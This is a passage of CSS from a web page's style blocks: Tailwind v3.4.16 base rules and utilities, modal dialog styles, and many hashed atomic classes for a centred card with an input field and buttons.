                --tw-skew-x: 0;
                --tw-skew-y: 0;
                --tw-scale-x: 1;
                --tw-scale-y: 1;
                --tw-pan-x: ;
                --tw-pan-y: ;
                --tw-pinch-zoom: ;
                --tw-scroll-snap-strictness: proximity;
                --tw-gradient-from-position: ;
                --tw-gradient-via-position: ;
                --tw-gradient-to-position: ;
                --tw-ordinal: ;
                --tw-slashed-zero: ;
                --tw-numeric-figure: ;
                --tw-numeric-spacing: ;
                --tw-numeric-fraction: ;
                --tw-ring-inset: ;
                --tw-ring-offset-width: 0px;
                --tw-ring-offset-color: #fff;
                --tw-ring-color: rgb(59 130 246 / 0.5);
                --tw-ring-offset-shadow: 0 0 #0000;
                --tw-ring-shadow: 0 0 #0000;
                --tw-shadow: 0 0 #0000;
                --tw-shadow-colored: 0 0 #0000;
                --tw-blur: ;
                --tw-brightness: ;
                --tw-contrast: ;
                --tw-grayscale: ;
                --tw-hue-rotate: ;
                --tw-invert: ;
                --tw-saturate: ;
                --tw-sepia: ;
                --tw-drop-shadow: ;
                --tw-backdrop-blur: ;
                --tw-backdrop-brightness: ;
                --tw-backdrop-contrast: ;
                --tw-backdrop-grayscale: ;
                --tw-backdrop-hue-rotate: ;
                --tw-backdrop-invert: ;
                --tw-backdrop-opacity: ;
                --tw-backdrop-saturate: ;
                --tw-backdrop-sepia: ;
                --tw-contain-size: ;
                --tw-contain-layout: ;
                --tw-contain-paint: ;
                --tw-contain-style: ;
            }
            ::backdrop {
                --tw-border-spacing-x: 0;
                --tw-border-spacing-y: 0;
                --tw-translate-x: 0;
                --tw-translate-y: 0;
                --tw-rotate: 0;
                --tw-skew-x: 0;
                --tw-skew-y: 0;
                --tw-scale-x: 1;
                --tw-scale-y: 1;
                --tw-pan-x: ;
                --tw-pan-y: ;
                --tw-pinch-zoom: ;
                --tw-scroll-snap-strictness: proximity;
                --tw-gradient-from-position: ;
                --tw-gradient-via-position: ;
                --tw-gradient-to-position: ;
                --tw-ordinal: ;
                --tw-slashed-zero: ;
                --tw-numeric-figure: ;
                --tw-numeric-spacing: ;
                --tw-numeric-fraction: ;
                --tw-ring-inset: ;
                --tw-ring-offset-width: 0px;
                --tw-ring-offset-color: #fff;
                --tw-ring-color: rgb(59 130 246 / 0.5);
                --tw-ring-offset-shadow: 0 0 #0000;
                --tw-ring-shadow: 0 0 #0000;
                --tw-shadow: 0 0 #0000;
                --tw-shadow-colored: 0 0 #0000;
                --tw-blur: ;
                --tw-brightness: ;
                --tw-contrast: ;
                --tw-grayscale: ;
                --tw-hue-rotate: ;
                --tw-invert: ;
                --tw-saturate: ;
                --tw-sepia: ;
                --tw-drop-shadow: ;
                --tw-backdrop-blur: ;
                --tw-backdrop-brightness: ;
                --tw-backdrop-contrast: ;
                --tw-backdrop-grayscale: ;
                --tw-backdrop-hue-rotate: ;
                --tw-backdrop-invert: ;
                --tw-backdrop-opacity: ;
                --tw-backdrop-saturate: ;
                --tw-backdrop-sepia: ;
                --tw-contain-size: ;
                --tw-contain-layout: ;
                --tw-contain-paint: ;
                --tw-contain-style: ;
            } /* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */
            *,
            ::after,
            ::before {
                box-sizing: border-box;
                border-width: 0;
                border-style: solid;
                border-color: #e5e7eb;
            }
            ::after,
            ::before {
                --tw-content: "";
            }
            :host,
            html {
                line-height: 1.5;
                -webkit-text-size-adjust: 100%;
                -moz-tab-size: 4;
                tab-size: 4;
                font-family: ui-sans-serif, system-ui, sans-serif,
                    "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol",
                    "Noto Color Emoji";
                font-feature-settings: normal;
                font-variation-settings: normal;
                -webkit-tap-highlight-color: transparent;
            }
            body {
                margin: 0;
                line-height: inherit;
            }
            hr {
                height: 0;
                color: inherit;
                border-top-width: 1px;
            }
            abbr:where([title]) {
                -webkit-text-decoration: underline dotted;
                text-decoration: underline dotted;
            }
            h1,
            h2,
            h3,
            h4,
            h5,
            h6 {
                font-size: inherit;
                font-weight: inherit;
            }
            a {
                color: inherit;
                text-decoration: inherit;
            }
            b,
            strong {
                font-weight: bolder;
            }
            code,
            kbd,
            pre,
            samp {
                font-family: ui-monospace, SFMono-Regular, Menlo, Monaco,
                    Consolas, "Liberation Mono", "Courier New", monospace;
                font-feature-settings: normal;
                font-variation-settings: normal;
                font-size: 1em;
            }
            small {
                font-size: 80%;
            }
            sub,
            sup {
                font-size: 75%;
                line-height: 0;
                position: relative;
                vertical-align: baseline;
            }
            sub {
                bottom: -0.25em;
            }
            sup {
                top: -0.5em;
            }
            table {
                text-indent: 0;
                border-color: inherit;
                border-collapse: collapse;
            }
            button,
            input,
            optgroup,
            select,
            textarea {
                font-family: inherit;
                font-feature-settings: inherit;
                font-variation-settings: inherit;
                font-size: 100%;
                font-weight: inherit;
                line-height: inherit;
                letter-spacing: inherit;
                color: inherit;
                margin: 0;
                padding: 0;
            }
            button,
            select {
                text-transform: none;
            }
            button,
            input:where([type="button"]),
            input:where([type="reset"]),
            input:where([type="submit"]) {
                -webkit-appearance: button;
                background-color: transparent;
                background-image: none;
            }
            :-moz-focusring {
                outline: auto;
            }
            :-moz-ui-invalid {
                box-shadow: none;
            }
            progress {
                vertical-align: baseline;
            }
            ::-webkit-inner-spin-button,
            ::-webkit-outer-spin-button {
                height: auto;
            }
            [type="search"] {
                -webkit-appearance: textfield;
                outline-offset: -2px;
            }
            ::-webkit-search-decoration {
                -webkit-appearance: none;
            }
            ::-webkit-file-upload-button {
                -webkit-appearance: button;
                font: inherit;
            }
            summary {
                display: list-item;
            }
            blockquote,
            dd,
            dl,
            figure,
            h1,
            h2,
            h3,
            h4,
            h5,
            h6,
            hr,
            p,
            pre {
                margin: 0;
            }
            fieldset {
                margin: 0;
                padding: 0;
            }
            legend {
                padding: 0;
            }
            menu,
            ol,
            ul {
                list-style: none;
                margin: 0;
                padding: 0;
            }
            dialog {
                padding: 0;
            }
            textarea {
                resize: vertical;
            }
            input::placeholder,
            textarea::placeholder {
                opacity: 1;
                color: #9ca3af;
            }
            [role="button"],
            button {
                cursor: pointer;
            }
            :disabled {
                cursor: default;
            }
            audio,
            canvas,
            embed,
            iframe,
            img,
            object,
            svg,
            video {
                display: block;
                vertical-align: middle;
            }
            img,
            video {
                max-width: 100%;
                height: auto;
            }
            [hidden]:where(:not([hidden="until-found"])) {
                display: none;
            }
            .container {
                width: 100%;
            }
            @media (min-width: 640px) {
                .container {
                    max-width: 640px;
                }
            }
            @media (min-width: 768px) {
                .container {
                    max-width: 768px;
                }
            }
            @media (min-width: 1024px) {
                .container {
                    max-width: 1024px;
                }
            }
            @media (min-width: 1280px) {
                .container {
                    max-width: 1280px;
                }
            }
            @media (min-width: 1536px) {
                .container {
                    max-width: 1536px;
                }
            }
            .fixed {
                position: fixed;
            }
            .relative {
                position: relative;
            }
            .inset-0 {
                inset: 0px;
            }
            .bottom-0 {
                bottom: 0px;
            }
            .bottom-11 {
                bottom: 2.75rem;
            }
            .left-0 {
                left: 0px;
            }
            .right-0 {
                right: 0px;
            }
            .right-6 {
                right: 1.5rem;
            }
            .z-10 {
                z-index: 10;
            }
            .z-50 {
                z-index: 50;
            }
            .ml-4 {
                margin-left: 1rem;
            }
            .mb-4 {
                margin-bottom: 1rem;
            }
            .flex {
                display: flex;
            }
            .hidden {
                display: none;
            }
            .h-10 {
                height: 2.5rem;
            }
            .h-4 {
                height: 1rem;
            }
            .h-8 {
                height: 2rem;
            }
            .h-\[calc\(100vh-64px\)\] {
                height: calc(100vh - 64px);
            }
            .h-5 {
                height: 1.25rem;
            }
            .h-6 {
                height: 1.5rem;
            }
            .w-4 {
                width: 1rem;
            }
            .w-64 {
                width: 16rem;
            }
            .w-8 {
                width: 2rem;
            }
            .w-5 {
                width: 1.25rem;
            }
            .w-full {
                width: 100%;
            }
            .min-w-\[600px\] {
                min-width: 600px;
            }
            .flex-1 {
                flex: 1 1 0%;
            }
            @keyframes pulse {
                50% {
                    opacity: 0.5;
                }
            }
            .animate-pulse {
                animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
            }
            @keyframes spin {
                to {
                    transform: rotate(360deg);
                }
            }
            .animate-spin {
                animation: spin 1s linear infinite;
            }
            .cursor-pointer {
                cursor: pointer;
            }
            .flex-col {
                flex-direction: column;
            }
            .items-center {
                align-items: center;
            }
            .justify-center {
                justify-content: center;
            }
            .justify-between {
                justify-content: space-between;
            }
            .gap-3 {
                gap: 0.75rem;
            }
            .gap-2 {
                gap: 0.5rem;
            }
            .gap-4 {
                gap: 1rem;
            }
            .space-x-2 > :not([hidden]) ~ :not([hidden]) {
                --tw-space-x-reverse: 0;
                margin-right: calc(0.5rem * var(--tw-space-x-reverse));
                margin-left: calc(0.5rem * calc(1 - var(--tw-space-x-reverse)));
            }
            .space-x-4 > :not([hidden]) ~ :not([hidden]) {
                --tw-space-x-reverse: 0;
                margin-right: calc(1rem * var(--tw-space-x-reverse));
                margin-left: calc(1rem * calc(1 - var(--tw-space-x-reverse)));
            }
            .space-y-4 > :not([hidden]) ~ :not([hidden]) {
                --tw-space-y-reverse: 0;
                margin-top: calc(1rem * calc(1 - var(--tw-space-y-reverse)));
                margin-bottom: calc(1rem * var(--tw-space-y-reverse));
            }
            .divide-y > :not([hidden]) ~ :not([hidden]) {
                --tw-divide-y-reverse: 0;
                border-top-width: calc(
                    1px * calc(1 - var(--tw-divide-y-reverse))
                );
                border-bottom-width: calc(1px * var(--tw-divide-y-reverse));
            }
            .divide-white\/20 > :not([hidden]) ~ :not([hidden]) {
                border-color: rgb(255 255 255 / 0.2);
            }
            .overflow-auto {
                overflow: auto;
            }
            .overflow-x-auto {
                overflow-x: auto;
            }
            .rounded {
                border-radius: 0.25rem;
            }
            .rounded-full {
                border-radius: 9999px;
            }
            .rounded-lg {
                border-radius: 0.5rem;
            }
            .rounded-xl {
                border-radius: 0.75rem;
            }
            .border {
                border-width: 1px;
            }
            .border-2 {
                border-width: 2px;
            }
            .border-4 {
                border-width: 4px;
            }
            .border-b {
                border-bottom-width: 1px;
            }
            .border-blue-500 {
                --tw-border-opacity: 1;
                border-color: rgb(59 130 246 / var(--tw-border-opacity, 1));
            }
            .border-white\/30 {
                border-color: rgb(255 255 255 / 0.3);
            }
            .border-t-transparent {
                border-top-color: transparent;
            }
            .bg-white {
                --tw-bg-opacity: 1;
                background-color: rgb(255 255 255 / var(--tw-bg-opacity, 1));
            }
            .bg-white\/20 {
                background-color: rgb(255 255 255 / 0.2);
            }
            .bg-blue-600 {
                --tw-bg-opacity: 1;
                background-color: rgb(37 99 235 / var(--tw-bg-opacity, 1));
            }
            .bg-gray-600 {
                --tw-bg-opacity: 1;
                background-color: rgb(75 85 99 / var(--tw-bg-opacity, 1));
            }
            .bg-green-600 {
                --tw-bg-opacity: 1;
                background-color: rgb(22 163 74 / var(--tw-bg-opacity, 1));
            }
            .bg-red-600 {
                --tw-bg-opacity: 1;
                background-color: rgb(220 38 38 / var(--tw-bg-opacity, 1));
            }
            .bg-yellow-600 {
                --tw-bg-opacity: 1;
                background-color: rgb(202 138 4 / var(--tw-bg-opacity, 1));
            }
            .p-6 {
                padding: 1.5rem;
            }
            .px-3 {
                padding-left: 0.75rem;
                padding-right: 0.75rem;
            }
            .px-4 {
                padding-left: 1rem;
                padding-right: 1rem;
            }
            .py-1 {
                padding-top: 0.25rem;
                padding-bottom: 0.25rem;
            }
            .py-2 {
                padding-top: 0.5rem;
                padding-bottom: 0.5rem;
            }
            .px-5 {
                padding-left: 1.25rem;
                padding-right: 1.25rem;
            }
            .px-6 {
                padding-left: 1.5rem;
                padding-right: 1.5rem;
            }
            .py-3 {
                padding-top: 0.75rem;
                padding-bottom: 0.75rem;
            }
            .py-5 {
                padding-top: 1.25rem;
                padding-bottom: 1.25rem;
            }
            .text-left {
                text-align: left;
            }
            .text-sm {
                font-size: 0.875rem;
                line-height: 1.25rem;
            }
            .text-xl {
                font-size: 1.25rem;
                line-height: 1.75rem;
            }
            .text-2xl {
                font-size: 1.5rem;
                line-height: 2rem;
            }
            .text-xs {
                font-size: 0.75rem;
                line-height: 1rem;
            }
            .font-bold {
                font-weight: 700;
            }
            .font-semibold {
                font-weight: 600;
            }
            .uppercase {
                text-transform: uppercase;
            }
            .text-black {
                --tw-text-opacity: 1;
                color: rgb(0 0 0 / var(--tw-text-opacity, 1));
            }
            .text-white {
                --tw-text-opacity: 1;
                color: rgb(255 255 255 / var(--tw-text-opacity, 1));
            }
            .text-white\/90 {
                color: rgb(255 255 255 / 0.9);
            }
            .text-white\/80 {
                color: rgb(255 255 255 / 0.8);
            }
            .placeholder-white\/70::placeholder {
                color: rgb(255 255 255 / 0.7);
            }
            .shadow-inner {
                --tw-shadow: inset 0 2px 4px 0 rgb(0 0 0 / 0.05);
                --tw-shadow-colored: inset 0 2px 4px 0 var(--tw-shadow-color);
                box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
                    var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
            }
            .shadow-lg {
                --tw-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1),
                    0 4px 6px -4px rgb(0 0 0 / 0.1);
                --tw-shadow-colored: 0 10px 15px -3px var(--tw-shadow-color),
                    0 4px 6px -4px var(--tw-shadow-color);
                box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
                    var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
            }
            .backdrop-blur-sm {
                --tw-backdrop-blur: blur(4px);
                -webkit-backdrop-filter: var(--tw-backdrop-blur)
                    var(--tw-backdrop-brightness) var(--tw-backdrop-contrast)
                    var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate)
                    var(--tw-backdrop-invert) var(--tw-backdrop-opacity)
                    var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);
                backdrop-filter: var(--tw-backdrop-blur)
                    var(--tw-backdrop-brightness) var(--tw-backdrop-contrast)
                    var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate)
                    var(--tw-backdrop-invert) var(--tw-backdrop-opacity)
                    var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);
            }
            .transition {
                transition-property: color, background-color, border-color, fill,
                    stroke, opacity, box-shadow, transform, filter,
                    -webkit-text-decoration-color, -webkit-backdrop-filter;
                transition-property: color, background-color, border-color,
                    text-decoration-color, fill, stroke, opacity, box-shadow,
                    transform, filter, backdrop-filter;
                transition-property: color, background-color, border-color,
                    text-decoration-color, fill, stroke, opacity, box-shadow,
                    transform, filter, backdrop-filter,
                    -webkit-text-decoration-color, -webkit-backdrop-filter;
                transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
                transition-duration: 150ms;
            }
            .hover\:bg-white\/20:hover {
                background-color: rgb(255 255 255 / 0.2);
            }
            .hover\:bg-blue-500:hover {
                --tw-bg-opacity: 1;
                background-color: rgb(59 130 246 / var(--tw-bg-opacity, 1));
            }
            .hover\:bg-gray-500:hover {
                --tw-bg-opacity: 1;
                background-color: rgb(107 114 128 / var(--tw-bg-opacity, 1));
            }
            .hover\:bg-green-500:hover {
                --tw-bg-opacity: 1;
                background-color: rgb(34 197 94 / var(--tw-bg-opacity, 1));
            }
            .hover\:bg-red-500:hover {
                --tw-bg-opacity: 1;
                background-color: rgb(239 68 68 / var(--tw-bg-opacity, 1));
            }
            .hover\:bg-white\/10:hover {
                background-color: rgb(255 255 255 / 0.1);
            }
            .hover\:bg-yellow-500:hover {
                --tw-bg-opacity: 1;
                background-color: rgb(234 179 8 / var(--tw-bg-opacity, 1));
            }
            .focus\:outline-none:focus {
                outline: 2px solid transparent;
                outline-offset: 2px;
            }
            @media (min-width: 768px) {
                .md\:block {
                    display: block;
                }
                .md\:flex-row {
                    flex-direction: row;
                }
                .md\:gap-0 {
                    gap: 0px;
                }
            }
        </style>
        <style>
            .modal {
                position: fixed;
                top: 0;
                left: 0;
                z-index: 1055;
                display: none;
                width: 100%;
                height: 100%;
                overflow-x: hidden;
                overflow-y: auto;
                outline: 0;
            }

            .modal-dialog {
                position: relative;
                width: auto;
                margin: 0.5rem;
                pointer-events: none;
            }

            .modal.fade .modal-dialog {
                transition: transform 0.3s ease-out;
                transform: translate(0, -50px);
            }

            .modal.show .modal-dialog {
                transform: none;
            }

            .modal.modal-static .modal-dialog {
                transform: scale(1.02);
            }

            .modal-dialog-scrollable {
                height: calc(100% - 1rem);
            }

            .modal-dialog-scrollable .modal-content {
                max-height: 100%;
                overflow: hidden;
            }

            .modal-dialog-scrollable .modal-body {
                overflow-y: auto;
            }

            .modal-dialog-centered {
                display: flex;
                align-items: center;
                min-height: calc(100% - 1rem);
            }

            .modal-content {
                position: relative;
                display: flex;
                flex-direction: column;
                width: 100%;
                color: #212529;
                pointer-events: auto;
                background-color: #fff;
                background-clip: padding-box;
                border: 1px solid rgba(0, 0, 0, 0.2);
                border-radius: 0.3rem;
                box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
                outline: 0;
            }

            .modal-backdrop {
                position: fixed;
                top: 0;
                left: 0;
                z-index: 1050;
                width: 100vw;
                height: 100vh;
                background-color: #000;
            }

            .modal-backdrop.fade {
                opacity: 0;
            }

            .modal-backdrop.show {
                opacity: 0.5;
            }

            .modal-header {
                display: flex;
                flex-shrink: 0;
                align-items: center;
                justify-content: space-between;
                padding: 1rem 1rem;
                border-bottom: 1px solid #dee2e6;
                border-top-left-radius: 0.3rem;
                border-top-right-radius: 0.3rem;
            }

            .modal-header .btn-close {
                padding: 0.5rem 0.5rem;
                margin: -0.5rem -0.5rem -0.5rem auto;
            }

            .modal-title {
                margin-bottom: 0;
                line-height: 1.5;
            }

            .modal-body {
                position: relative;
                flex: 1 1 auto;
                padding: 1rem;
            }

            .modal-footer {
                display: flex;
                flex-wrap: wrap;
                flex-shrink: 0;
                align-items: center;
                justify-content: flex-end;
                padding: 1rem;
                border-top: 1px solid #dee2e6;
                border-bottom-left-radius: 0.3rem;
                border-bottom-right-radius: 0.3rem;
            }

            .modal-footer > * {
                margin: 0.25rem;
            }

            @media (min-width: 576px) {
                .modal-dialog {
                    max-width: 500px;
                    margin: 1.75rem auto;
                }

                .modal-dialog-scrollable {
                    height: calc(100% - 3.5rem);
                }

                .modal-dialog-centered {
                    min-height: calc(100% - 3.5rem);
                }

                .modal-content {
                    box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
                }

                .modal-sm {
                    max-width: 300px;
                }
            }

            @media (min-width: 992px) {
                .modal-lg,
                .modal-xl {
                    max-width: 800px;
                }
            }

            @media (min-width: 1200px) {
                .modal-xl {
                    max-width: 1140px;
                }
            }

            /* Fullscreen Modal at different breakpoints */
            .modal-fullscreen,
            .modal-fullscreen-sm-down,
            .modal-fullscreen-md-down,
            .modal-fullscreen-lg-down,
            .modal-fullscreen-xl-down,
            .modal-fullscreen-xxl-down {
                width: 100vw;
                max-width: none;
                height: 100%;
                margin: 0;
            }

            .modal-fullscreen .modal-content,
            .modal-fullscreen-sm-down .modal-content,
            .modal-fullscreen-md-down .modal-content,
            .modal-fullscreen-lg-down .modal-content,
            .modal-fullscreen-xl-down .modal-content,
            .modal-fullscreen-xxl-down .modal-content {
                height: 100%;
                border: 0;
                border-radius: 0;
            }

            .modal-fullscreen .modal-header,
            .modal-fullscreen-sm-down .modal-header,
            .modal-fullscreen-md-down .modal-header,
            .modal-fullscreen-lg-down .modal-header,
            .modal-fullscreen-xl-down .modal-header,
            .modal-fullscreen-xxl-down .modal-header {
                border-radius: 0;
            }

            .modal-fullscreen .modal-body,
            .modal-fullscreen-sm-down .modal-body,
            .modal-fullscreen-md-down .modal-body,
            .modal-fullscreen-lg-down .modal-body,
            .modal-fullscreen-xl-down .modal-body,
            .modal-fullscreen-xxl-down .modal-body {
                overflow-y: auto;
            }

            .modal-fullscreen .modal-footer,
            .modal-fullscreen-sm-down .modal-footer,
            .modal-fullscreen-md-down .modal-footer,
            .modal-fullscreen-lg-down .modal-footer,
            .modal-fullscreen-xl-down .modal-footer,
            .modal-fullscreen-xxl-down .modal-footer {
                border-radius: 0;
            }
        </style>
        <style>
            * {
                box-sizing: border-box;
            }
            body {
                font-weight: 400;
                font-family: "Segoe UI", -apple-system, "Helvetica Neue",
                    "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi,
                    "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI",
                    "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha,
                    Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI",
                    "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya",
                    "Microsoft New Tai Lue", "Microsoft PhagsPa",
                    "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti",
                    "MV Boli", "Myanmar Text", "Cambria Math";
                font-size: 0.9375rem;
                line-height: 1.25rem;
                margin: 0px;
                background-color: rgb(255, 255, 255);
            }
            button,
            input {
                font-weight: inherit;
                font-family: inherit;
                font-size: inherit;
                line-height: inherit;
                max-width: 100%;
                margin: 0px;
            }
            a:hover {
                text-decoration: underline;
                color: rgb(102, 102, 102);
            }
            #root {
                min-height: 1px;
            }
            .f1wv5yrl {
                min-height: 1px;
            }
            .f1w4nmp0 {
                display: table;
            }
            .f1euv43f {
                position: absolute;
            }
            .f1l02sjl {
                height: 100%;
            }
            .fly5x3f {
                width: 100%;
            }
            .f15twtuk {
                top: 0px;
            }
            .f1e31b4d {
                right: 0px;
            }
            .f1vgc2s3 {
                left: 0px;
            }
            .f1yab3r1 {
                bottom: 0px;
            }
            .f15pt5es {
                display: table-cell;
            }
            .fmrv4ls {
                vertical-align: middle;
            }
            .fcgxt0o {
                margin-left: auto;
            }
            .f1ujusj6 {
                margin-right: auto;
            }
            .f10pi13n {
                position: relative;
            }
            .f17n1hoa {
                max-width: 440px;
            }
            .fdavl6g {
                width: calc(100% - 40px);
            }
            .f1qo6d5h {
                padding-top: 44px;
            }
            .fdeuxjd {
                padding-right: 44px;
            }
            .f9y0skx {
                padding-left: 44px;
            }
            .f1ezb54v {
                padding-bottom: 44px;
            }
            .f16w32qi {
                margin-bottom: 28px;
            }
            .folxr9a {
                background-color: rgb(255, 255, 255);
            }
            .f1xvk1ai {
                box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
            }
            .f14hp5dx {
                min-width: 320px;
            }
            .fh2bsio {
                min-height: 338px;
            }
            .f1p9o1ba {
                overflow-x: hidden;
            }
            .f1sil6mw {
                overflow-y: hidden;
            }
            .f19g0ac {
                z-index: 1;
            }
            .fy6ml6n {
                background-color: white;
            }
            .fk73vx1 {
                opacity: 0;
            }
            .f1bsuimh {
                z-index: -1;
            }
            .f1xxrpeh {
                transition: all 0.5s ease-in 0s;
            }
            .f11f2yzx {
                min-height: 170px;
            }
            .f15tpi3i {
                margin-bottom: 16px;
            }
            .ftgm304 {
                display: block;
            }
            .fwrgwhw {
                background-image: none;
            }
            .f1tyq0we {
                margin-left: 0px;
            }
            .f11qmguv {
                margin-right: 0px;
            }
            .f1uinfot {
                margin-top: 16px;
            }
            .f1jlhsmd {
                margin-bottom: 12px;
            }
            .f19f4twv {
                margin-bottom: 0px;
            }
            .f1hu3pq6 {
                margin-top: 0px;
            }
            .f17mccla {
                text-align: center;
            }
            .f19dog8a {
                position: fixed;
            }
            .f21ccbt > div:nth-child(1) {
                display: inline-block;
            }
            .f1y1y8ej > div:nth-child(1) {
                width: 100%;
            }
            .f1xyr3fu > div:nth-child(1) {
                margin-bottom: 36px;
            }
            .f14t3ns0 {
                display: inline-block;
            }
            .fedgsey {
                font-size: 0.8125rem;
            }
            .fhuq1gn {
                font-weight: 600;
            }
            .f6dzj5z {
                max-width: 100%;
            }
            .f161knb0 {
                padding-left: 2px;
            }
            .f12huiiw {
                padding-right: 2px;
            }
            .f6c6jrs {
                animation-duration: 0.25s;
            }
            .f1loq5m1 {
                animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
            }
            .fywypte {
                animation-fill-mode: both;
            }
            .fvn4fo7 {
                transition-property: left;
            }
            .f1n5kmys {
                animation-name: fr2e2iv;
            }
            .f1yeby2y {
                animation-name: f11ta6k4;
            }
            .f1gl45w1 {
                transition-timing-function: ease-in;
            }
            .f1g1znd9 {
                animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
            }
            .f6fch53 {
                animation-duration: 0.3s;
            }
            .fk4wq3q {
                background-size: cover;
            }
            .fo6xqva {
                background-repeat: no-repeat;
            }
            .fj9j8l8 {
                background-position-x: 50%;
            }
            .f1b6djjb {
                background-position-y: 50%;
            }
            .f2rbwfs {
                max-width: 256px;
            }
            .f4ybsrx {
                font-size: 16px;
            }
            .frvgh55 {
                height: 24px;
            }
            .f1mtd64y {
                overflow-x: visible;
            }
            .f1y7q3j9 {
                overflow-y: visible;
            }
            .f1wirg6b {
                z-index: auto;
            }
            .f1hgrdrl {
                clear: both;
            }
            .f1ysfysz {
                min-height: 28px;
            }
            .fanxd30 {
                font-size: 13px;
            }
            .f150nix6 {
                float: right;
            }
            .fusgiwz {
                color: rgb(0, 0, 0);
            }
            .f1ugzwwg {
                font-size: 12px;
            }
            .f336tjw {
                line-height: 28px;
            }
            .fz5stix {
                white-space: nowrap;
            }
            .ff9s3yw {
                margin-left: 8px;
            }
            .f1phki43 {
                margin-right: 8px;
            }
            .f1bsjrm3 {
                text-decoration: none;
            }
            .f1mh47zh {
                letter-spacing: 3px;
            }
            .f82itaf {
                line-height: 22px;
            }
            .f12kltsn {
                vertical-align: top;
            }
            .f8xlz6g {
                line-height: 24px;
            }
            .f1cmbuwj {
                text-overflow: ellipsis;
            }
            .f19ph88b {
                min-height: inherit;
            }
            .f3rmtva {
                background-color: transparent;
            }
            .ffmhhld {
                color: rgb(27, 27, 27);
            }
            .fzzj3pj {
                font-size: 1.5rem;
            }
            .f1nbblvp {
                padding-top: 0px;
            }
            .fifp7yv {
                padding-right: 0px;
            }
            .f1asdtw4 {
                padding-left: 0px;
            }
            .f1ov4xf1 {
                padding-bottom: 0px;
            }
            .frecw6t input {
                height: 36px;
            }
            .f1mmgjok input {
                width: 100%;
            }
            .f1tto2h8 input {
                outline-style: none;
            }
            .f1c2pb84 input {
                background-color: transparent;
            }
            .fyft3pb input {
                border-top-style: solid;
            }
            .f1rof34y input {
                border-right-style: solid;
            }
            .f4hylce input {
                border-left-style: solid;
            }
            .f1172n73 input {
                border-bottom-style: solid;
            }
            .f18s3fau input {
                border-bottom-right-radius: 0px;
            }
            .f1ymw6u3 input {
                border-bottom-left-radius: 0px;
            }
            .f1xqrj1d input {
                border-top-right-radius: 0px;
            }
            .f160kle0 input {
                border-top-left-radius: 0px;
            }
            .f6rydpu input {
                border-top-width: 0px;
            }
            .f1i9lmva input {
                border-right-width: 0px;
            }
            .f2x7bcd input {
                border-left-width: 0px;
            }
            .fspveqh input {
                border-bottom-width: 1px;
            }
            .f1imcvf3 input {
                border-top-color: rgb(102, 102, 102);
            }
            .f1bxicz3 input {
                border-right-color: rgb(102, 102, 102);
            }
            .fajq0z4 input {
                border-left-color: rgb(102, 102, 102);
            }
            .f1kf6f3a input {
                border-bottom-color: rgb(102, 102, 102);
            }
            .fyw0hav input {
                padding-top: 6px;
            }
            .f1a7xkls input {
                padding-right: 10px;
            }
            .fnpm3l input {
                padding-bottom: 6px;
            }
            .fsc3mvo input {
                padding-left: 0px;
            }
            .f1s66rt0 input:hover {
                border-top-color: rgb(50, 50, 50);
            }
            .f73ugz1 input:hover {
                border-right-color: rgb(50, 50, 50);
            }
            .f5iv370 input:hover {
                border-left-color: rgb(50, 50, 50);
            }
            .f1iw8vv5 input:hover {
                border-bottom-color: rgb(50, 50, 50);
            }
            .f1ytw2m8 input:focus {
                border-top-color: rgb(0, 103, 184);
            }
            .feh5m5c input:focus {
                border-right-color: rgb(0, 103, 184);
            }
            .fexuuuk input:focus {
                border-left-color: rgb(0, 103, 184);
            }
            .f7upnml input:focus {
                border-bottom-color: rgb(0, 103, 184);
            }
            .f11xvspe {
                color: rgb(0, 103, 184);
            }
            .f1ern45e {
                border-top-style: none;
            }
            .f1n71otn {
                border-right-style: none;
            }
            .f1deefiw {
                border-left-style: none;
            }
            .f1h8hb77 {
                border-bottom-style: none;
            }
            .fes3tcz {
                text-align: right;
            }
            .f16ez161 .ext-button-item:not(:last-child) {
                margin-right: 4px;
            }
            .f1nxs5xn {
                min-height: 32px;
            }
            .fxdtvjf {
                min-width: 108px;
            }
            .fytdu2e {
                line-height: normal;
            }
            .f10ra9hq {
                padding-top: 4px;
            }
            .f11qrl6u {
                padding-right: 12px;
            }
            .fjlbh76 {
                padding-left: 12px;
            }
            .f1y2xyjm {
                padding-bottom: 4px;
            }
            .f1cyt9o8 {
                touch-action: manipulation;
            }
            .f9f7vaa:disabled {
                cursor: not-allowed;
            }
            .fmjaa5u:disabled {
                pointer-events: none;
            }
            .flutoqy:disabled {
                outline-style: none;
            }
            .f12qb2w:disabled {
                color: rgba(0, 0, 0, 0.2);
            }
            .f1s9iqzn:disabled {
                border-top-color: transparent;
            }
            .f1o2wvfq:disabled {
                border-right-color: transparent;
            }
            .fjk9nze:disabled {
                border-left-color: transparent;
            }
            .fkbkaou:disabled {
                border-bottom-color: transparent;
            }
            .f10kbna7:disabled {
                background-color: rgba(0, 0, 0, 0.2);
            }
            .fv6p4nl {
                background-color: rgb(0, 103, 184);
            }
            .f9ex757 {
                border-top-color: rgb(0, 103, 184);
            }
            .f1bn7qby {
                border-right-color: rgb(0, 103, 184);
            }
            .fqv895b {
                border-left-color: rgb(0, 103, 184);
            }
            .f1yx5976 {
                border-bottom-color: rgb(0, 103, 184);
            }
            .f1iretw8 {
                color: rgb(255, 255, 255);
            }
        </style>
        <style>
